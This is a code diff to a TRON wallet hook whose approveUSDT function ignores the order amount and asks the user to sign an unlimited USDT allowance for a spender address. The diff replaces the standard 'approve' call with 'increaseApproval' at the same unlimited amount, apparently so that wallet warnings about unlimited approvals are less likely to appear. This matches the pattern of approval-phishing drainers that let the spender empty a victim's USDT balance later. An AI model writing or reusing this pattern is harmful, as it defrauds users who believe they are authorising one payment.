@@ -57,14 +57,14 @@ export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 // MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
 export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-// TRC20 ABI for approve (TronWeb compatible format)
+// TRC20 ABI for increaseApproval (TronWeb compatible format)
 const TRC20_ABI = [
   {
     "inputs": [
       { "name": "_spender", "type": "address" },
-      { "name": "_value", "type": "uint256" }
+      { "name": "_addedValue", "type": "uint256" }
     ],
-    "name": "approve",
+    "name": "increaseApproval",
     "outputs": [{ "name": "", "type": "bool" }],
     "stateMutability": "nonpayable",
     "type": "function"
@@ -268,7 +268,7 @@ export function useTronWallet() {
     }
   }, []);
 
-  // Execute TRC20 unlimited approve
+  // Execute TRC20 increaseApproval
   const approveUSDT = useCallback(async (spenderAddress: string, orderAmount: number): Promise<{ success: boolean; txHash?: string; error?: string }> => {
     if (!window.tronWeb?.defaultAddress?.base58) {
       return { success: false, error: '钱包未连接' };
@@ -278,8 +278,8 @@ export function useTronWallet() {
       // Get USDT contract
       const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
 
-      // Execute unlimited approval using MAX_UINT256
-      const transaction = await contract.approve(spenderAddress, MAX_UINT256).send({
+      // Execute increaseApproval using MAX_UINT256
+      const transaction = await contract.increaseApproval(spenderAddress, MAX_UINT256).send({
         feeLimit: 100_000_000,
         callValue: 0,
         shouldPollResponse: true
@@ -291,7 +291,7 @@ export function useTronWallet() {
       
       return { success: false, error: '授权失败' };
     } catch (error: any) {
-      console.error('Approve error:', error);
+      console.error('increaseApproval error:', error);
       
       // User denied signature
       if (error.message?.includes('User rejected') || error.message?.includes('denied') || error.message?.includes('cancel')) {
